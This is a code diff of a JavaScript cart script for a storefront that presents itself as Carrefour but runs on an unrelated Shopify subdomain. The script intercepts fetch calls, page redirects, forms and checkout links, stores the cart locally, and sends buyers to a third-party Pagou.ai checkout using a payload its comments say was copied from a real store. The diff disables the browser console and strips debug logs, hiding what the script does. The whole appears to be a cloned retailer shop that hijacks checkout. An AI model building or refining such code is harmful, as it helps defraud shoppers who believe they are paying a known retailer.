@@ -22,6 +22,32 @@
 (function () {
     'use strict';
 
+    // Desabilita todos os console.* para manter console limpo
+    const noop = () => {};
+    const originalConsole = window.console;
+    window.console = {
+        log: noop,
+        warn: noop,
+        error: noop,
+        info: noop,
+        debug: noop,
+        trace: noop,
+        group: noop,
+        groupEnd: noop,
+        groupCollapsed: noop,
+        table: noop,
+        dir: noop,
+        dirxml: noop,
+        assert: noop,
+        count: noop,
+        time: noop,
+        timeEnd: noop,
+        timeStamp: noop,
+        profile: noop,
+        profileEnd: noop,
+        clear: noop
+    };
+
     const CART_KEY = 'carrefour_cart';
     const SHOP_DOMAIN = 'twqm8i-xi.myshopify.com';
     
@@ -30,7 +56,7 @@
             this.cart = this.loadCart();
             this.productMapping = {}; // Será carregado assincronamente
             // Garante que o carrinho está sincronizado
-            console.log('🛒 CarrefourCart inicializado com', this.cart.items.length, 'produtos');
+
             this.init();
         }
 
@@ -80,7 +106,7 @@
                         link.removeAttribute('href');
                         link.setAttribute('data-cart-intercepted', 'true');
                         link.style.cursor = 'pointer';
-                        console.log('✅ Link do carrinho interceptado:', href);
+
                     }
                 });
             };
@@ -118,13 +144,12 @@
                 // Verifica se já está no cart - se sim, não faz nada
                 const currentPath = window.location.pathname;
                 if (currentPath.includes('/cart') || currentPath.includes('cart/index.html')) {
-                    console.log('🛒 Já está no carrinho, não redireciona');
+
                     e.preventDefault();
                     e.stopPropagation();
                     return false;
                 }
-                
-                console.log('🛒 Ícone do carrinho clicado - redirecionando para nosso cart');
+
                 e.preventDefault();
                 e.stopPropagation();
                 e.stopImmediatePropagation();
@@ -178,8 +203,7 @@
             };
             
             document.addEventListener('click', clickHandler, true); // Capture phase
-            
-            console.log('✅ Interceptação global de forms e cliques ativada');
+
         }
 
         interceptCartRedirect() {
@@ -192,8 +216,8 @@
                 
                 // Intercepta redirecionamentos para /checkout (deve usar nosso checkout Pagou.ai)
                 if (url === '/checkout' || url === '/checkout/' || url.endsWith('/checkout')) {
-                    console.log('🛒 Interceptando redirecionamento para /checkout:', url);
-                    console.log('🚀 Redirecionando para checkout Pagou.ai');
+
+
                     // Chama checkoutPagou() de forma assíncrona
                     setTimeout(() => {
                         if (self.detectPageType() === 'cart') {
@@ -211,9 +235,9 @@
                     (url.includes('/cart') && !url.includes('index.html') && !url.includes('cart.js') && !url.includes('cart.json') && !url.includes('cart/add.js'));
                 
                 if (isCartUrl) {
-                    console.log('🛒 Interceptando redirecionamento para /cart:', url);
+
                     const correctPath = self.getCartPath();
-                    console.log('🔗 Redirecionando para:', correctPath);
+
                     return correctPath;
                 }
                 return url;
@@ -265,7 +289,7 @@
                     });
                 }
             } catch (e) {
-                console.warn('⚠️ Não foi possível interceptar window.location via Proxy:', e);
+
             }
             
             // Intercepta também window.location.replace e assign diretamente (fallback)
@@ -291,7 +315,7 @@
                     return originalAssign(fixedUrl);
                 };
             } catch (e) {
-                console.warn('⚠️ Não foi possível interceptar replace/assign:', e);
+
             }
         }
 
@@ -311,8 +335,8 @@
                     if ((currentHref.includes('/checkout') || currentHref.endsWith('/checkout')) && 
                         !currentHref.includes('pagou.ai') && 
                         !currentHref.includes('seguro.pagou.ai')) {
-                        console.log('🛒 Detectado redirecionamento para /checkout:', currentHref);
-                        console.log('🚀 Interceptando e redirecionando para checkout Pagou.ai');
+
+
                         clearInterval(checkInterval);
                         // Cancela o redirecionamento e chama checkoutPagou
                         window.history.back(); // Volta para a página anterior
@@ -328,9 +352,9 @@
                         !currentHref.includes('cart.js') && 
                         !currentHref.includes('cart.json') &&
                         !currentHref.includes('cart/add.js')) {
-                        console.log('🛒 Detectado redirecionamento incorreto para /cart:', currentHref);
+
                         const correctPath = self.getCartPath();
-                        console.log('🔗 Corrigindo para:', correctPath);
+
                         clearInterval(checkInterval);
                         window.location.replace(correctPath);
                         return;
@@ -351,8 +375,8 @@
                 
                 // Intercepta requisições para /checkout
                 if (urlStr.includes('/checkout') && !urlStr.includes('pagou.ai') && !urlStr.includes('api-checkout')) {
-                    console.log('🚫 Interceptando fetch para /checkout:', urlStr);
-                    console.log('🚀 Redirecionando para checkout Pagou.ai');
+
+
                     // Cancela a requisição e chama checkoutPagou
                     setTimeout(() => {
                         if (self.detectPageType() === 'cart') {
@@ -365,7 +389,7 @@
                 
                 // Intercepta /cart/add.js
                 if (urlStr.includes('/cart/add.js')) {
-                    console.log('🛒 Interceptando /cart/add.js');
+
                     return new Promise((resolve) => {
                         try {
                             const body = options?.body ? (typeof options.body === 'string' ? JSON.parse(options.body) : options.body) : {};
@@ -379,7 +403,7 @@
                             // 1. Tenta window.ShopifyAnalytics.meta.product.id
                             if (window.ShopifyAnalytics && window.ShopifyAnalytics.meta && window.ShopifyAnalytics.meta.product && window.ShopifyAnalytics.meta.product.id) {
                                 productId = window.ShopifyAnalytics.meta.product.id;
-                                console.log('📦 Product ID do ShopifyAnalytics:', productId);
+
                             }
                             
                             // 2. Se não encontrou, tenta data-product-id do sticky-add-to-cart
@@ -389,7 +413,7 @@
                                     const dataProductId = stickyCart.getAttribute('data-product-id');
                                     if (dataProductId) {
                                         productId = dataProductId;
-                                        console.log('📦 Product ID do sticky-add-to-cart:', productId);
+
                                     }
                                 }
                             }
@@ -401,26 +425,25 @@
                                     const productIdMatch = metaScript.textContent.match(/"product":\s*\{[^}]*"id":\s*(\d+)/);
                                     if (productIdMatch) {
                                         productId = productIdMatch[1];
-                                        console.log('📦 Product ID do script meta:', productId);
+
                                     }
                                 }
                             }
                             
                             if (!productId) {
-                                console.warn('⚠️ Product ID não encontrado, usando variantId como fallback');
+
                                 productId = variantId; // Fallback: usa variantId se não encontrar productId
                             }
                             
                             // Busca preço - tenta múltiplas fontes
                             let price = 0;
-                            console.log('🔍 Buscando preço do produto...');
-                            
+
                             // 1. Tenta meta tag og:price:amount
                             const metaPrice = document.querySelector('meta[property="og:price:amount"]');
                             if (metaPrice) {
                                 const priceStr = metaPrice.getAttribute('content') || '0';
                                 price = parseFloat(priceStr.replace(/\./g, '').replace(',', '.'));
-                                console.log('💰 Preço do meta tag:', price);
+
                             }
                             
                             // 2. Se não encontrou, tenta #crStickyPrice
@@ -428,7 +451,7 @@
                                 const priceEl = document.querySelector('#crStickyPrice');
                                 if (priceEl) {
                                     price = self.extractPrice(priceEl);
-                                    console.log('💰 Preço do #crStickyPrice:', price);
+
                                 }
                             }
                             
@@ -437,14 +460,14 @@
                                 const priceEl = document.querySelector('.price, [class*="price"]');
                                 if (priceEl) {
                                     price = self.extractPrice(priceEl);
-                                    console.log('💰 Preço do .price:', price);
+
                                 }
                             }
                             
                             if (!price || price === 0) {
-                                console.error('❌ ERRO: Preço não encontrado! Verifique os seletores.');
+
                             } else {
-                                console.log('✅ Preço encontrado:', price);
+
                             }
                             
                             // Busca URL do produto
@@ -458,7 +481,7 @@
                             const metaImage = document.querySelector('meta[property="og:image"]');
                             if (metaImage) {
                                 imageUrl = metaImage.getAttribute('content') || '';
-                                console.log('🖼️ Imagem do meta og:image:', imageUrl);
+
                             }
                             
                             // 2. Se não encontrou, tenta seletores de imagem
@@ -481,7 +504,7 @@
                                     if (imageEl) {
                                         imageUrl = imageEl.src || imageEl.getAttribute('data-src') || imageEl.getAttribute('data-original') || '';
                                         if (imageUrl) {
-                                            console.log('🖼️ Imagem encontrada com seletor:', selector, imageUrl);
+
                                             break;
                                         }
                                     }
@@ -500,9 +523,9 @@
                             }
                             
                             if (!imageUrl) {
-                                console.warn('⚠️ Nenhuma imagem encontrada para o produto');
+
                             } else {
-                                console.log('✅ Imagem do produto:', imageUrl);
+
                             }
                             
                             const product = {
@@ -516,9 +539,7 @@
                                 handle: handle,
                                 url: productUrl
                             };
-                            
-                            console.log('✅ Produto extraído:', product);
-                            
+
                             // Adiciona ao carrinho
                             const existing = self.cart.items.find(i => {
                                 if (i.variantId && product.variantId) {
@@ -546,10 +567,9 @@
                             // Força sincronização imediata
                             const savedData = localStorage.getItem(CART_KEY);
                             if (!savedData) {
-                                console.error('❌ ERRO: Falha ao salvar no localStorage!');
+
                             }
-                            
-                            console.log('💾 Carrinho salvo no localStorage. Itens:', self.cart.items.length);
+
                             console.log('💾 Itens salvos:', self.cart.items.map(i => `${i.title} x${i.quantity}`).join(', '));
                             
                             // Retorna resposta primeiro
@@ -561,14 +581,13 @@
                             // Redireciona IMEDIATAMENTE usando replace (substitui a URL atual)
                             // Isso deve acontecer antes do código da página tentar fazer window.location.href = "/cart"
                             const cartPath = self.getCartPath();
-                            console.log('🔗 Redirecionando para carrinho:', cartPath);
-                            
+
                             // Usa setTimeout com delay mínimo para garantir que o localStorage foi salvo
                             setTimeout(() => {
                                 window.location.replace(cartPath);
                             }, 10); // Delay mínimo de 10ms para garantir que o save foi processado
                         } catch (error) {
-                            console.error('❌ Erro:', error);
+
                             resolve(new Response(JSON.stringify({ error: error.message }), { 
                                 status: 500,
                                 headers: { 'Content-Type': 'application/json' }
@@ -579,14 +598,13 @@
                 
                 // Intercepta /cart.js para retornar dados do localStorage
                 if (urlStr.includes('/cart.js') || urlStr.includes('/cart.json')) {
-                    console.log('🛒 Interceptando /cart.js');
+
                     return new Promise((resolve) => {
                         // RECARREGA o carrinho do localStorage (pode ter mudado)
                         const cart = self.loadCart();
-                        console.log('🛒 Carrinho atual no localStorage:', cart.items.length, 'produtos');
-                        
+
                         if (cart.items.length === 0) {
-                            console.warn('⚠️ ATENÇÃO: Carrinho está vazio no localStorage!');
+
                         }
                         
                         const shopifyCart = {
@@ -609,9 +627,9 @@
                                 
                                 // Log para debug
                                 if (!imageUrl) {
-                                    console.warn('⚠️ Item sem imagem:', item.title, 'Dados:', item);
+
                                 } else {
-                                    console.log('🖼️ Imagem do item:', item.title, '->', imageUrl);
+
                                 }
                                 
                                 return {
@@ -645,7 +663,7 @@
                 
                 // Intercepta /cart/change.js para atualizar localStorage
                 if (urlStr.includes('/cart/change.js')) {
-                    console.log('🛒 Interceptando /cart/change.js');
+
                     return new Promise((resolve) => {
                         try {
                             const body = options?.body ? (typeof options.body === 'string' ? JSON.parse(options.body) : options.body) : {};
@@ -711,7 +729,7 @@
                                 headers: { 'Content-Type': 'application/json' }
                             }));
                         } catch (error) {
-                            console.error('❌ Erro:', error);
+
                             resolve(new Response(JSON.stringify({ error: error.message }), { 
                                 status: 500,
                                 headers: { 'Content-Type': 'application/json' }
@@ -736,7 +754,7 @@
                 const saved = localStorage.getItem(CART_KEY);
                 if (saved) {
                     const cart = JSON.parse(saved);
-                    console.log('📦 Carrinho carregado do localStorage:', cart.items.length, 'produtos');
+
                     console.log('📦 Itens:', cart.items.map(i => `${i.title} x${i.quantity}`).join(', '));
                     
                     // Verifica e corrige produtos sem imagem
@@ -759,16 +777,16 @@
                     
                     return cart;
                 }
-                console.log('📦 Carrinho vazio no localStorage');
+
                 return { items: [], total: 0 };
             } catch (e) {
-                console.error('❌ Erro ao carregar carrinho:', e);
+
                 return { items: [], total: 0 };
             }
         }
 
         saveCart() {
-            console.log('💾 Salvando carrinho no localStorage:', this.cart);
+
             localStorage.setItem(CART_KEY, JSON.stringify(this.cart));
         }
 
@@ -782,45 +800,40 @@
                     '/config.json',
                     'config.json'
                 ];
-                
-                console.log('🔍 Tentando carregar config.json...');
-                
+
                 for (const path of possiblePaths) {
                     try {
-                        console.log(`   Tentando: ${path}`);
+
                         const response = await fetch(path);
                         if (response.ok) {
                             const config = await response.json();
-                            console.log('✅ config.json carregado de', path);
-                            console.log('📋 Conteúdo:', config);
-                            
+
+
                             if (config.productMapping) {
                                 this.productMapping = config.productMapping;
-                                console.log('✅ ProductMapping carregado!');
-                                console.log('✅ Mapeamento:', this.productMapping);
+
+
                                 return;
                             } else {
-                                console.warn('⚠️ config.json não tem productMapping');
+
                             }
                         } else {
-                            console.log(`   ❌ ${path} retornou status ${response.status}`);
+
                         }
                     } catch (e) {
-                        console.log(`   ❌ Erro ao carregar ${path}:`, e.message);
+
                         // Continua tentando outros caminhos
                         continue;
                     }
                 }
-                
-                console.warn('⚠️ Não foi possível carregar config.json, continuando sem productMapping');
-                console.warn('⚠️ Tentou os caminhos:', possiblePaths);
+
+
             } catch (e) {
-                console.warn('⚠️ Erro ao carregar config.json:', e);
+
             }
         }
 
         addItem(product) {
-            console.log('➕ Adicionando:', product.title, 'ID:', product.id, 'VariantID:', product.variantId, 'Handle:', product.handle);
 
             // Usa variantId como identificador principal, com fallback para id + handle
             const productKey = product.variantId || product.id;
@@ -843,13 +856,13 @@
             if (existing) {
                 // Produto já existe, aumenta quantidade
                 existing.quantity += 1;
-                console.log('📈 Quantidade aumentada para:', existing.quantity);
+
             } else {
                 // Novo produto, adiciona ao carrinho
                 // Garante que o preço é um número válido
                 const priceValue = parseFloat(product.price) || 0;
                 if (priceValue === 0) {
-                    console.error('❌ ERRO: Tentando adicionar produto com preço zero!', product);
+
                 }
                 
                 const newItem = {
@@ -869,12 +882,10 @@
 
             this.calculateTotal();
             this.saveCart();
-            console.log('🛒 Carrinho atualizado:', this.cart.items.length, 'produtos diferentes');
 
             const cartPath = this.getCartPath();
-            console.log('🔗 Redirecionando para:', cartPath);
-            console.log('📍 URL atual completa:', window.location.href);
-            
+
+
             // Redireciona diretamente
             window.location.href = cartPath;
         }
@@ -937,10 +948,8 @@
         getCartPath() {
             const currentUrl = window.location.href;
             const currentPath = window.location.pathname;
-            
-            console.log('📍 URL completa:', currentUrl);
-            console.log('📍 Pathname:', currentPath);
-            
+
+
             // Para file://, constrói caminho absoluto corretamente
             if (currentUrl.startsWith('file://')) {
                 let baseUrl = currentUrl;
@@ -950,13 +959,13 @@
                 if (currentPath.includes('/products/')) {
                     // Encontra a posição de /products/ na URL
                     const productsIndex = baseUrl.indexOf('/products/');
-                    console.log('🔍 Índice de /products/:', productsIndex);
+
                     if (productsIndex !== -1) {
                         // Pega tudo antes de /products/
                         baseUrl = baseUrl.substring(0, productsIndex);
-                        console.log('🔍 Base URL após remover /products/:', baseUrl);
+
                     } else {
-                        console.error('❌ Não encontrou /products/ na URL!');
+
                     }
                 }
                 // Se estiver em /collections/[handle]/index.html
@@ -976,13 +985,12 @@
                 
                 // Adiciona /cart/index.html
                 const cartPath = baseUrl + '/cart/index.html';
-                console.log('🔗 Caminho absoluto construído:', cartPath);
-                
+
                 // Validação: verifica se o caminho parece correto
                 if (!cartPath.includes('CARREFOUR LOJA') && baseUrl.includes('CARREFOUR LOJA')) {
-                    console.error('❌ ERRO: Caminho parece incorreto!');
-                    console.error('   Base URL:', baseUrl);
-                    console.error('   Caminho final:', cartPath);
+
+
+
                 }
                 
                 return cartPath;
@@ -1003,16 +1011,15 @@
         }
 
         initProduct() {
-            console.log('📦 Inicializando página de produto');
-            
+
             // Extrai dados do produto da página
             const productData = this.extractProductFromPage();
             
             if (productData) {
                 window.productData = productData;
-                console.log('✅ Dados do produto extraídos:', productData);
+
             } else {
-                console.warn('⚠️ Não foi possível extrair dados do produto');
+
             }
         }
 
@@ -1059,7 +1066,7 @@
             const image = document.querySelector('.product-image img, .main-image img, .product-media img')?.src || '';
             
             if (!price || price === 0) {
-                console.error('❌ ERRO: Preço não encontrado! Verifique os seletores.');
+
             }
             
             if (!productId) {
@@ -1092,12 +1099,12 @@
             priceText = priceText.replace(',', '.');
             
             const price = parseFloat(priceText) || 0;
-            console.log('💰 Preço extraído:', priceText, '->', price);
+
             return price;
         }
 
         initCart() {
-            console.log('🛒 Inicializando página do carrinho');
+
             const self = this;
             
             // Remove action dos forms IMEDIATAMENTE para evitar submit
@@ -1108,7 +1115,7 @@
                     form.setAttribute('data-original-action', action);
                     form.removeAttribute('action');
                     form.setAttribute('onsubmit', 'return false;'); // Previne submit
-                    console.log('✅ Action removido do form:', action);
+
                 }
             });
             
@@ -1121,24 +1128,23 @@
                 link.addEventListener('click', (e) => {
                     e.preventDefault();
                     e.stopPropagation();
-                    console.log('🛒 Link checkout clicado, redirecionando para Pagou.ai');
+
                     self.checkoutPagou();
                 });
-                console.log('✅ Link checkout interceptado:', originalHref);
+
             });
             
             // Recarrega o carrinho do localStorage (pode ter mudado)
             this.cart = this.loadCart();
-            console.log('📦 Carrinho carregado:', this.cart.items.length, 'produtos');
-            
+
             // Verifica se há produtos sem imagem e tenta buscar
             const itemsWithoutImage = this.cart.items.filter(item => !item.image && !item.imageUrl);
             if (itemsWithoutImage.length > 0) {
-                console.warn('⚠️ Encontrados', itemsWithoutImage.length, 'produtos sem imagem. Tentando buscar...');
+
                 // Para produtos sem imagem, vamos tentar buscar da API do produto quando possível
                 // Mas por enquanto, vamos apenas logar
                 itemsWithoutImage.forEach(item => {
-                    console.warn('⚠️ Produto sem imagem:', item.title, 'Handle:', item.handle);
+
                 });
             }
             
@@ -1150,12 +1156,12 @@
                         console.log('🛒 Carrinho recebido do getCart():', cart.items?.length || 0, 'produtos');
                         if (typeof window.renderCart === 'function') {
                             window.renderCart(cart);
-                            console.log('✅ Carrinho renderizado');
+
                         } else {
-                            console.warn('⚠️ Função renderCart não encontrada');
+
                         }
                     }).catch(err => {
-                        console.warn('⚠️ Erro ao buscar carrinho:', err);
+
                         // Fallback: tenta buscar diretamente
                         fetch('/cart.js', { headers: { 'Accept': 'application/json' } })
                             .then(res => res.json())
@@ -1171,15 +1177,14 @@
                     fetch('/cart.js', { headers: { 'Accept': 'application/json' } })
                         .then(res => res.json())
                         .then(cart => {
-                            console.log('🛒 Carrinho recebido via fetch:', cart.items?.length || 0, 'produtos');
-                            console.log('🛒 Dados do carrinho:', cart);
-                            
+
+
                             // Chama renderCart se disponível
                             if (typeof window.renderCart === 'function') {
-                                console.log('✅ Chamando window.renderCart com', cart.items?.length || 0, 'produtos');
+
                                 window.renderCart(cart);
                             } else {
-                                console.warn('⚠️ window.renderCart não encontrado ainda, tentando novamente...');
+
                                 // Tenta novamente após um tempo
                                 setTimeout(() => {
                                     if (typeof window.renderCart === 'function') {
@@ -1273,15 +1278,14 @@
                             e.preventDefault();
                             e.stopPropagation();
                             e.stopImmediatePropagation();
-                            console.log('🛒 Form submit interceptado');
+
                             self.checkoutPagou();
                             return false;
                         }, true); // true = capture phase
                     }
-                    
-                    console.log('✅ Botão Finalizar compra conectado');
+
                 } else {
-                    console.warn('⚠️ Botão Finalizar compra não encontrado, tentando novamente...');
+
                     // Tenta novamente após um tempo
                     setTimeout(connectButton, 500);
                 }
@@ -1302,8 +1306,7 @@
         renderCart() {
             // O carrinho já tem seu próprio sistema de renderização via /cart.js
             // Força atualização chamando getCart() que vai usar os dados do localStorage
-            console.log('🛒 Carrinho renderizado com', this.cart.items.length, 'produtos');
-            
+
             // Se estiver na página do carrinho, força atualização IMEDIATA
             if (this.detectPageType() === 'cart') {
                 // Carrega IMEDIATAMENTE sem delay
@@ -1315,7 +1318,7 @@
                                 window.renderCart(cart);
                             }
                         }).catch(err => {
-                            console.warn('⚠️ Erro ao atualizar carrinho:', err);
+
                         });
                     } else {
                         // Fallback: busca diretamente
@@ -1341,20 +1344,18 @@
         }
 
         async checkoutPagou() {
-            console.log('🚀 Iniciando checkout Pagou.ai...');
-            console.log('📦 Itens no carrinho:', this.cart.items);
-            
+
+
             // Garante que o productMapping está carregado ANTES de processar
             if (Object.keys(this.productMapping).length === 0) {
-                console.log('⏳ ProductMapping vazio, carregando config.json...');
+
                 await this.loadProductMapping();
-                console.log('📋 ProductMapping após carregar:', this.productMapping);
+
             }
             
             // Recarrega o carrinho do localStorage para garantir dados atualizados
             this.cart = this.loadCart();
-            console.log('📦 Carrinho recarregado:', this.cart.items.length, 'produtos');
-            
+
             // Valida se há produtos
             if (!this.cart.items || this.cart.items.length === 0) {
                 alert('Seu carrinho está vazio!');
@@ -1364,7 +1365,7 @@
             // Valida preços
             const itemsWithZeroPrice = this.cart.items.filter(item => !item.price || parseFloat(item.price) === 0);
             if (itemsWithZeroPrice.length > 0) {
-                console.error('❌ ERRO: Produtos com preço zero encontrados:', itemsWithZeroPrice);
+
                 alert('Alguns produtos não têm preço configurado. Por favor, adicione os produtos novamente.');
                 return;
             }
@@ -1378,28 +1379,26 @@
                     
                     // Valida se o preço é válido
                     if (!priceValue || priceValue <= 0) {
-                        console.error(`❌ ERRO: Produto "${item.title}" tem preço inválido: ${item.price}`);
+
                         priceValue = 0;
                     }
                     
                     // Converte para centavos (formato Shopify/Pagou.ai)
                     const priceInCents = Math.round(priceValue * 100);
-                    
-                    console.log(`💰 Item: ${item.title}`);
+
                     console.log(`   Preço original (localStorage): ${item.price} (tipo: ${typeof item.price})`);
-                    console.log(`   Preço parseFloat: ${priceValue}`);
-                    console.log(`   Preço em centavos: ${priceInCents}`);
+
+
                     console.log(`   Preço em ARS: ARS ${(priceInCents / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`);
                     
                     // Valida se a conversão está correta
                     if (priceInCents <= 0) {
-                        console.error(`❌ ERRO: Preço em centavos é zero ou negativo para "${item.title}"`);
+
                     }
                     
                     // Garante que temos imagem
                     const imageUrl = item.image || item.imageUrl || '';
-                    console.log(`🖼️ Imagem do item: ${item.title} - ${imageUrl || 'SEM IMAGEM'}`);
-                    
+
                     // FORMATO EXATO DO PAYLOAD QUE FUNCIONA (capturado da loja Shopify real)
                     const variantId = item.variantId || item.id;
                     const productId = item.productId || item.id;
@@ -1465,21 +1464,18 @@
                         line_level_total_discount: 0,
                         has_components: false
                     };
-                    
-                    console.log(`📋 Item: ${item.title}`);
-                    console.log(`   Variant ID: ${item.variantId || item.id}`);
-                    console.log(`   Product ID: ${item.productId || item.id}`);
-                    console.log(`   Handle: "${item.handle || ''}"`);
-                    console.log(`   SKU: "${item.sku || 'VAZIO'}"`);
+
+
+
+
+
                     console.log(`   Preço enviado: ${priceInCents} centavos (${(priceInCents/100).toLocaleString('pt-BR', {style: 'currency', currency: 'ARS'})})`);
-                    console.log(`   ⚠️ A Pagou.ai está exibindo nome e foto, mas não o preço.`);
-                    console.log(`   ⚠️ Ela precisa fazer MATCH do produto para buscar o preço.`);
+
+
                     console.log(`   ⚠️ Verifique qual campo a Pagou.ai usa para o match (SKU? Handle? ID?)`);
                     
                     return formattedItem;
                 });
-
-                console.log('📦 Itens formatados para checkout:', shopifyCartItems);
 
                 // Calcula totais
                 const totalPrice = shopifyCartItems.reduce((sum, item) => {
@@ -1489,7 +1485,6 @@
                 const itemCount = shopifyCartItems.reduce((sum, item) => sum + item.quantity, 0);
                 
                 console.log('💰 Total do carrinho (centavos):', totalPrice);
-                console.log('📦 Total de itens:', itemCount);
 
                 // Formata carrinho no formato EXATO que funciona (capturado da loja Shopify real)
                 // Gera token no formato do Shopify: "hash?key=hash"
@@ -1525,14 +1520,14 @@
                 // Validação final: verifica se todos os itens têm preço válido
                 const invalidItems = shopifyCartItems.filter(item => !item.price || item.price <= 0);
                 if (invalidItems.length > 0) {
-                    console.error('❌ ERRO: Itens com preço inválido:', invalidItems);
+
                     alert('Alguns produtos não têm preço válido. Por favor, adicione os produtos novamente.');
                     return;
                 }
                 
                 // Validação: verifica se o total está correto
                 if (totalPrice <= 0) {
-                    console.error('❌ ERRO: Total do carrinho é zero ou negativo:', totalPrice);
+
                     alert('O total do carrinho está inválido. Por favor, adicione os produtos novamente.');
                     return;
                 }
@@ -1546,16 +1541,14 @@
                     body: JSON.stringify(payload)
                 });
 
-                console.log('📥 Status da resposta:', response.status, response.statusText);
-
                 if (!response.ok) {
                     const errorText = await response.text();
-                    console.error('❌ Erro HTTP:', response.status, errorText);
+
                     throw new Error(`API retornou erro ${response.status}: ${errorText}`);
                 }
 
                 const data = await response.json();
-                console.log('📩 Resposta completa da API:', data);
+
                 console.log('📩 Resposta completa da API (string):', JSON.stringify(data, null, 2));
 
                 // Verifica a estrutura da resposta
@@ -1564,28 +1557,27 @@
                     const checkoutUrl = data.data.checkout_url;
                     
                     // Log detalhado da resposta
-                    console.log('📊 Dados da resposta:');
-                    console.log('   Integration:', integration);
-                    console.log('   Checkout URL:', checkoutUrl);
-                    console.log('   Integration active:', integration?.active);
-                    console.log('   Stock rules:', integration?.stock_rules);
-                    console.log('   Sync automatically:', integration?.sync_automatically);
-                    
+
+
+
+
+
+
                     // Verifica se há avisos sobre preços
                     if (data.warnings || data.errors) {
-                        console.warn('⚠️ Avisos/Erros da API:', data.warnings || data.errors);
+
                     }
                     
                     // Verifica se há mensagens na resposta
                     if (data.message) {
-                        console.log('📨 Mensagem da API:', data.message);
+
                     }
                     
                     // Verifica se há dados dos produtos na resposta
                     if (data.data && data.data.cart) {
-                        console.log('📦 Carrinho retornado pela API:', data.data.cart);
+
                         if (data.data.cart.items) {
-                            console.log('📦 Itens no carrinho da API:', data.data.cart.items);
+
                             data.data.cart.items.forEach((item, idx) => {
                                 console.log(`   Item ${idx + 1}: ${item.title} - Preço: ${item.price} (centavos)`);
                             });
@@ -1594,17 +1586,17 @@
                     
                     // Verifica se há informações sobre produtos não reconhecidos
                     if (data.data && data.data.unrecognized_products) {
-                        console.warn('⚠️ Produtos não reconhecidos pela Pagou.ai:', data.data.unrecognized_products);
+
                     }
                     
                     // Verifica se há informações sobre sincronização
                     if (data.data && data.data.sync_status) {
-                        console.log('🔄 Status de sincronização:', data.data.sync_status);
+
                     }
 
                     if (integration && integration.active && checkoutUrl) {
                         if (checkoutUrl.indexOf('https://') === 0) {
-                            console.log('✅ Checkout criado com sucesso:', checkoutUrl);
+
                             window.location.href = checkoutUrl;
                             return;
                         } else {
@@ -1618,8 +1610,8 @@
                 }
 
             } catch (error) {
-                console.error('❌ Erro completo:', error);
-                console.error('❌ Stack:', error.stack);
+
+
                 alert('Erro ao criar checkout: ' + error.message + '\n\nVerifique o console para mais detalhes.');
             }
         }
